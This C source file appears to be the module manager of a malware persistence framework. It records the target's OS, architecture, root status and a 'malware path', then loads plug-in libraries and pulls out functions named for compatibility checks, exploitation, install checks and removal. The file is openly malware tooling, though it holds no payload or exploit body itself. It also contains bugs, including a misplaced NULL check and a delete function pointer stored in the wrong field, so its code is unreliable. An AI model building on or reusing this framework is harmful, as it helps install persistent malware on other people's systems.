#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../headers/percistency_hub.h"
#include "../headers/helpers.h"
#include "../headers/errors.h"

int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *path_to_malware){

	int is_error;

	// Allocate the ENVIRONMENT object
	if (*env != NULL)
		free(*env);
	*env = (ENVIRONMENT *)malloc(sizeof(ENVIRONMENT));
	if (env == NULL)
		return ERROR_OPERAING_SYSTEM_UNABLE_TO_ALLOCATE;

	// Copy the object members
	(*env)->operating_system = os;
	(*env)->architecture = arch;
	(*env)->is_root = is_root;

	// Copy the malware path
	is_error = copy_string(&(*env)->malware_path, path_to_malware);
	if (is_error != 0)
		return is_error;

	// Return
	return 0;

}

int autoset_environment(ENVIRONMENT **env, const char *path_to_malware){

	ARCHITECTURE arch;
	ROOTED_STATE is_root;
	int is_error;

	// Get architecture
	is_error = get_system_details(ARCHITECTURE_BITS, &arch);
	if (is_error != 0)
		return is_error;

	// Check root
	is_error = get_system_details(ROOT_CHECK, &is_root);
	if (is_error != 0)
		return is_error;

	// Init the environment
	return set_environment(env, TARGET_OPERAING_SYSTEM, arch, is_root, path_to_malware);

}

int free_environment(ENVIRONMENT **env){

	// Free members and objects
	if (*env != NULL){
		free((*env)->malware_path);
		free(*env);
		*env = NULL;
	}

	// Return
	return 0;

}

int get_all_modules(MODULE_WALLET **wallet){

	char *extension_ptr;
	int i, is_error;

	// Allocate the wallet
	if (*wallet != NULL){
		free(*wallet);
	}
	*wallet = (MODULE_WALLET *)malloc(sizeof(MODULE_WALLET));

	// Get all filenames
	is_error = get_all_files_from_folder(MODULES_FOLDER, &(*wallet)->count, &(*wallet)->names, MAX_MODULES);
	if (is_error != 0)
		return is_error;

	// Process the filenames
	for (i = 0; i < (*wallet)->count; i++){
		extension_ptr = strstr(((*wallet)->names)[i], MODULE_EXTENSION);
		if (extension_ptr != NULL)
			*extension_ptr = '\0';
	}

	// Return
	return 0;

}

int free_module_wallet(MODULE_WALLET **wallet){

	int i;

	if (*wallet != NULL){
		for (i = 0; i < MAX_MODULES; i++){
			free((*wallet)->names[i]);
		}
		free((*wallet)->names);
		free(*wallet);
		*wallet = NULL;
	}
	
	// Return
	return 0;

}

int is_module_present(MODULE_WALLET *wallet, const char *name){

	int i;

	// Check arguments
	if (wallet == NULL || name == NULL)
		return ERROR_PROGRAMMING_INVALID_ARGUMENT;

	// Iterate the wallet
	for (i = 0; i < wallet->count; i++){
		if (strcmp(wallet->names[i], name) == 0)
			return i;
	}

	// Return
	return ERROR_MODULE_MANAGER_NOT_FOUND;

}

int load_module(LOADED_MODULE **module, const char *name){

	int error;

	// Allocate the module
	if (*module != NULL)
		free(*module);
	*module = (LOADED_MODULE *)malloc(sizeof(LOADED_MODULE));

	// Load module
	error = load_library(name, &(*module)->handle);
	if (error != 0)
		return error;

	// Copy the name
	copy_string(&(*module)->name, name);

	// Get function pointers
	error = get_function_pointer((*module)->handle, FUNC_NAME_CHECK_COMPATIBILIY, &(*module)->check_compatibility);
	if (error != 0)
		return error;
	error = get_function_pointer((*module)->handle, FUNC_NAME_EXPLOIT, &(*module)->exploit);
	if (error != 0)
		return error;
	error = get_function_pointer((*module)->handle, FUNC_NAME_CHECK_INSTALLED, &(*module)->check_installed);
	if (error != 0)
		return error;
	error = get_function_pointer((*module)->handle, FUNC_NAME_DELETE_INSTALLED, &(*module)->check_compatibility);
	if (error != 0)
		return error;

	// Return
	return 0;

}

int unlink_module(LOADED_MODULE **module){

	// Unlink the handle
	close_handle((*module)->handle);

	// Free
	free((*module)->name);
	free(*module);
	*module = NULL;

	// Return
	return 0;

}